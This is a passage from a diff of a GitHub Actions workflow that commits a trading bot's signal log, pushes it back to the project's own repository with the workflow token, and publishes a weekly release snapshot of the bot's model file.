+          git add signal_log.json
+          git commit -m "Update signal log with optimized quant execution" || echo "No changes"
+          git push https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/dhntan88/doomsday.git HEAD:main
+
+      - name: Weekly model backup to GitHub Release (portable, independent of cache/account)
+        if: steps.quant_agent.outputs.should_backup == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          TAG="${{ steps.quant_agent.outputs.backup_tag }}"
+          gh release create "$TAG" model_quant.pkl model_meta.json \
+            --title "Model snapshot $TAG" \
+            --notes "Weekly automated snapshot of model_quant.pkl for portability (repo/account migration, disaster recovery). Not used by the bot at runtime -- runtime state lives in actions/cache." \
+            || echo "Release $TAG sudah ada atau gagal dibuat, skip."
